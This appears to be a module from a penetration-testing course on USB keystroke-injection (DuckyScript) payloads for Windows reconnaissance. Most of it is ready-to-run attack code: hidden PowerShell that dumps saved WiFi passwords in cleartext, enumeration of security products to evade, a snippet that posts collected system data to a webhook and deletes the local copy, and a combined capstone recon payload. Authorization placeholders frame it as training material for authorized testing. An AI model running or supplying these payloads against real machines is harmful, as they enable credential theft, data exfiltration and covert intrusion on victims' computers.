Section 1

System Information Gathering

The first reconnaissance objective is answering: what kind of machine is this, who uses it, and what privileges do we have? The following commands answer those questions using only built-in Windows utilities — no external tools required.

PowerShell — System Enumeration One-Liners 
# Current user and privilege level
whoami /all

# Full system information
systeminfo | Out-File C:\Users\Public\sysinfo.txt

# OS version, hostname, domain membership
(Get-WmiObject Win32_ComputerSystem) | Select-Object Name,Domain,Manufacturer,Model,TotalPhysicalMemory | Format-List

# Installed hotfixes (useful for exploit research)
Get-HotFix | Select-Object HotFixID,InstalledOn | Sort-Object InstalledOn -Descending | Select-Object -First 20

Example expected output from whoami /all on a domain-joined workstation:

Section 2

Network Enumeration

Understanding the network topology tells you what other systems are reachable, what services are running, and where to pivot. These commands require no elevated privileges on Windows.

PowerShell — Network Enumeration Commands 
# All network interfaces, IPs, and MAC addresses
ipconfig /all

# Active network connections (established + listening)
netstat -ano | findstr ESTABLISHED

# ARP cache — reveals other hosts on the LAN
arp -a

# Routing table — reveals subnets and gateways
route print

# DNS cache — reveals recently resolved hostnames
ipconfig /displaydns | findstr "Record Name" | Sort-Object

# Enumerate network shares on local machine
net share

# Ping sweep of local /24 subnet (quiet, no output to screen)
1..254 | ForEach-Object { $ip = "192.168.1.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip } } | Out-File C:\Users\Public\live_hosts.txt
Noise Warning

A ping sweep of a /24 generates 254 ICMP echo requests in rapid succession. This is detectable by a network IDS/IPS and will appear in network flow logs. On a pentest, coordinate with the Blue Team on whether active network scanning is in scope before running this technique.

Section 3

WiFi Password Extraction

Windows stores saved WiFi credentials in plaintext (for personal networks) or as recoverable keys, accessible to any local user without elevated privileges. The netsh wlan command family exposes all stored profiles.

DuckyScript — WiFi Credential Extraction Payload 
REM WiFi Password Extraction — Windows 10/11
REM Requires: standard user account (no elevation needed)
REM Auth: Insert SOW reference number here

DEFAULTDELAY 100
DELAY 3000

GUI r
DELAY 700

REM Run PowerShell hidden, extract all WiFi passwords to file
STRING powershell -W Hidden -Exec Bypass -Command "(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p = ($_ -split ':')[1].Trim(); $k = (netsh wlan show profile name=$p key=clear) | Select-String 'Key Content'; \"$p : $(($k -split ':')[1].Trim())\" } | Out-File C:\Users\Public\wifi.txt"
ENTER

Expected output in C:\Users\Public\wifi.txt:

HomeNetwork : MyP@ssw0rd123 CorpGuest : Welcome2023! iPhone_Hotspot : abc123xyz Starbucks_WiFi : (no password stored — open network)
Why This Works Without Admin Rights

Windows stores WiFi profiles in C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\ as XML files with the key encrypted via DPAPI — but netsh wlan show profile key=clear decrypts and displays them for any user who is logged into the same Windows session, because DPAPI uses the logged-in user's credentials for decryption.

Section 4

Installed Software and Security Tools

Enumerating installed software tells you what security tools to avoid, what vulnerable software versions are present, and what administrative tools (like remote access clients) can be leveraged.

PowerShell — Software Enumeration 
# List all installed programs from registry (faster than Get-Package)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName,DisplayVersion,Publisher |
  Where-Object { $_.DisplayName -ne $null } |
  Sort-Object DisplayName |
  Out-File C:\Users\Public\installed.txt

# Check for common security tools specifically
$tools = @("Defender","CrowdStrike","Carbon Black","SentinelOne","Cylance","Symantec","McAfee","Sophos","ESET","Trend Micro")
$tools | ForEach-Object {
    $found = Get-Process -Name "*$_*" -ErrorAction SilentlyContinue
    if ($found) { "RUNNING: $_" } else { "NOT FOUND: $_" }
} | Out-File C:\Users\Public\av_check.txt

# Running processes snapshot
Get-Process | Select-Object Name,Id,CPU,WorkingSet | Sort-Object CPU -Descending | Out-File C:\Users\Public\processes.txt
Section 5

Exfiltrating Recon Data

Collected recon data must be retrieved from the target. There are three primary exfiltration paths for HID-delivered payloads: write to USB mass storage (if using a combined HID+storage device), send to an attacker-controlled webhook over HTTPS, or encode data in DNS queries.

MethodProsConsDetection Risk
USB Mass Storage (file drop)No network required; fast; reliableRequires HID+storage device (e.g., Bash Bunny); file left on USBLow (no network traffic)
HTTPS Webhook (e.g., webhook.site)Remote retrieval; no physical pickup neededRequires network access; HTTPS traffic loggedMedium (outbound HTTPS)
DNS exfiltrationBypasses many egress filters; slow but stealthyComplex encoding; slow for large dataLow (DNS often unmonitored)
PowerShell — Webhook Exfiltration Example 
# Exfiltrate collected file to HTTPS webhook
# Replace URL with your authorized webhook endpoint
$data = Get-Content C:\Users\Public\sysinfo.txt -Raw
$body = @{ hostname = $env:COMPUTERNAME; data = $data } | ConvertTo-Json
Invoke-RestMethod -Uri "https://webhook.site/YOUR-UUID-HERE" -Method POST -Body $body -ContentType "application/json"

# Clean up local file after exfil
Remove-Item C:\Users\Public\sysinfo.txt -Force
Section 6 — Capstone for this Module

Full Recon Payload Walkthrough

This payload combines all recon techniques into a single, production-quality script. It collects system info, network data, WiFi passwords, and installed software, then saves everything to a single output file for retrieval.

DuckyScript — full-recon.dd (Complete Payload) 
REM ============================================
REM Payload: Full Windows Recon
REM Target: Windows 10/11
REM Output: C:\Users\Public\recon_output.txt
REM Auth: [INSERT SOW NUMBER]
REM ============================================

DEFAULTDELAY 80
DELAY 3000

GUI r
DELAY 700

REM Single PowerShell command — collects all recon data
STRING powershell -W Hidden -Exec Bypass -Command "$out='C:\Users\Public\recon_output.txt'; '=== SYSTEM ===' | Out-File $out; systeminfo | Out-File $out -Append; '=== WHOAMI ===' | Out-File $out -Append; whoami /all | Out-File $out -Append; '=== NETWORK ===' | Out-File $out -Append; ipconfig /all | Out-File $out -Append; '=== ARP ===' | Out-File $out -Append; arp -a | Out-File $out -Append; '=== WIFI ===' | Out-File $out -Append; (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); $k=(netsh wlan show profile name=$p key=clear) | Select-String 'Key Content'; \"$p : $(($k -split ':')[1].Trim())\" } | Out-File $out -Append"
ENTER
DELAY 8000

REM systeminfo takes 5-10 seconds on domain systems — wait for completion
REM Output file is now at C:\Users\Public\recon_output.txt
Execution Time Note

The systeminfo command contacts the domain controller to resolve domain information and can take 5–15 seconds on domain-joined systems. The 8-second DELAY after the command may need to be extended to 15000ms on slow domain networks. Always verify the output file was fully written before retrieving it.
